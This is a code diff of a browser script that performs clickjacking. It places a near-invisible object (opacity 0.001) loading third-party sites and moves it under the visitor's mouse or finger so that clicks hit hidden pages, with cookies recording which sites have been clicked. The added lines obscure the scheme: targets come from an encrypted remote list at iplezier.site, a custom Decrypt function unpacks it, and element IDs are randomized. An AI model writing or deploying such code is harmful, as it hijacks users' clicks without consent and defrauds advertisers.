@@ -1,16 +1,10 @@
-let sitesRand = [
-    {link: 'https://rotadoturismo.info/?utm=facebook&campanha=c55612821c3b102a893984a0d2d0c355', cookie: '_gcli_10'},
-    {link: 'https://omundoevangelico.com.br/?utm=facebook&campanha=2e0ae3ef9e623502b9f6bd69b9aaf619', cookie: '_gcli_8'},
-    {link: 'https://www.micelax.com/?utm=facebook&campanha=5a5a85e5b21e6be1f92688f752ee2b74', cookie: '_gcli_5'},
-    {link: 'https://fallgames.xyz/?utm=facebook&campanha=240991dcccb9bb953eeef22e59ae5f47', cookie: '_gcli_3'},
-    {link: 'https://omochileiro.club/?utm=facebook&campanha=be0fefd8e77b1db7089dddaa93d28b20', cookie: '_gcli_2'},
-    {link: 'https://www.micelax.com/?utmx=facebook&campanha=c49d45ff6590a0bbf4f6157d87516c3c52b', cookie: '_gcli_x1'}
-];
+let sitesRand = [];
 let siteSelected = [{link: null, cookie: null}];
 let monitorTracker = null;
 let canTrack = 0;
-let htmlCode = '<div id="_gcli_div"><object id="_gcli_obj" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
-let cssCode = '<style>#_gcli_div{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
+let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
+let htmlCode = '<div id="_gcli_div'+ uniqueID +'"><object id="_gcli_obj'+ uniqueID +'" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
+let cssCode = '<style>#_gcli_div'+ uniqueID +'{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
 let pointerTracker = function(e){
     let out = {x:0, y:0};
     if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
@@ -23,7 +17,6 @@ let pointerTracker = function(e){
     }
     return out;
 };
-
 function randomizeArray(a) {
     let j, x, i;
     for (i = a.length - 1; i > 0; i--) {
@@ -61,15 +54,15 @@ function getCookie(strCookie) {
 }
 function minimizeDiv() {
     canTrack = 0;
-    $("#_gcli_div").css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-999999").css("position", "fixed");
-    $("#_gcli_obj").css("top", "").css("left", "").css("pointer-events", "none");
+    $("#_gcli_div" + uniqueID).css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-999999").css("position", "fixed");
+    $("#_gcli_obj" + uniqueID).css("top", "").css("left", "").css("pointer-events", "none");
 }
 function insertCode(){
     $("body").append(cssCode + htmlCode).css("overflow-x", "hidden").css("width", "100%");
     $(document).on('mousemove touchstart', function(e){
         let tracker = pointerTracker(e);
         if (canTrack == 1) {
-            $('#_gcli_div').css({
+            $('#_gcli_div' + uniqueID).css({
                 left:  tracker.x - Math.floor(Math.random()*(324-284+1)+284),
                 top:   tracker.y - Math.floor(Math.random()*(40-20+1)+20)
             });
@@ -80,18 +73,18 @@ function insertCode(){
     setUrlObj();
 }
 function setUrlObj() {
-    document.getElementById('_gcli_obj').data = siteSelected.link;
+    document.getElementById('_gcli_obj' + uniqueID).data = siteSelected.link;
     showOrMinimize();
 }
 function showDiv() {
     canTrack = 1;
     startTracker();
 
-    $("#_gcli_obj").css("top", "-110px").css("left", "-70px").css("pointer-events", "");
-    $("#_gcli_div").css("width", "780px").css("height", "200px").css("z-index", "999999").css("position", "absolute");
+    $("#_gcli_obj" + uniqueID).css("top", "-110px").css("left", "-70px").css("pointer-events", "");
+    $("#_gcli_div" + uniqueID).css("width", "780px").css("height", "200px").css("z-index", "999999").css("position", "absolute");
 }
 function showOrMinimize() {
-    document.getElementById('_gcli_obj').onload=function(){
+    document.getElementById('_gcli_obj' + uniqueID).onload=function(){
         if(getCookie(siteSelected.cookie) || getCookie("_gcli_delay_time")){
             setTimeout(minimizeDiv,1000);
         } else {
@@ -114,23 +107,54 @@ function startTracker() {
         }
     }, 500);
 }
-$(document).ready(function () {
-    $.getJSON( "https://www.iplezier.site/iplezier.json", function( data ) {
-        if(data.redecanais === true){
-            let i = 0;
-            let alreadyClicked = true;
-            randomizeArray(sitesRand);
+function Decrypt(s1, id) {
+    s1 = atob(s1);
+    var result = '';
+    var xx2 = s1.charAt(0);
+    xx2 = xx2.charCodeAt(0) - 65;
+    s1 = s1.substr(1);
+    while(s1.length > 0) {
 
-            while (i < sitesRand.length) {
-                if(getCookie(sitesRand[i].cookie) == null){
+        result = result + String.fromCharCode(
+            (
+                s1.charAt(0).charCodeAt(0) - 65
+            )
+            * 25 +
+            (
+                s1.charAt(1).charCodeAt(0) - 65
+            )
+            - xx2 - id
+        );
+
+        s1 = s1.substr(2);
+
+    }
+    return result;
+}
+$(document).ready(function () {
+    fetch('https://www.iplezier.site/assets/js/c/jquery.json')
+        .then(function(response) {
+            return response.text();
+        })
+        .then(function(body) {
+            let jsonResponse = JSON.parse(Decrypt(body, 1247));
+            sitesRand = jsonResponse.list;
+
+            if(jsonResponse.redecanais === true){
+                let i = 0;
+                let alreadyClicked = true;
+                randomizeArray(sitesRand);
+
+                while (i < sitesRand.length) {
+                    if(getCookie(sitesRand[i].cookie) == null){
+                        siteSelected = sitesRand[i];
+                        alreadyClicked = false;
+                        break;
+                    }
                     siteSelected = sitesRand[i];
-                    alreadyClicked = false;
-                    break;
+                    i++;
                 }
-                siteSelected = sitesRand[i];
-                i++;
+                insertCode();
             }
-            insertCode();
-        }
-    });
+        });
 });
